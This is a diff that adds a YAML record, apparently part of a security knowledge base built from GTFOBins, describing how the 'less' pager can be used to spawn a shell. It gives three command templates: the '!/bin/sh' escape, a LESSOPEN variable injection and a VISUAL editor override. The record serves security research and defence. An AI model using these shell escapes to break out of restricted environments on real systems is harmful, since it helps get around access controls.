@@ -1,0 +1,32 @@
+id: gtfobins/less/shell/unprivileged
+type: binary
+platform: linux
+name: less
+phases:
+- execution
+capabilities:
+- shell
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'less /etc/hosts
+
+    !/bin/sh'
+- template: 'LESSOPEN="/bin/sh -s 1>&0 2>&0 # %s" less /etc/hosts
+
+    reset'
+  comment: The optional `reset` command is needed to receive the echo back of the typed keystrokes.
+- template: 'VISUAL=''/bin/sh -s --'' less /etc/hosts
+
+    v'
+references:
+- https://gtfobins.github.io/gtfobins/less/
+tags:
+- linux
+- unix
+- gtfobins
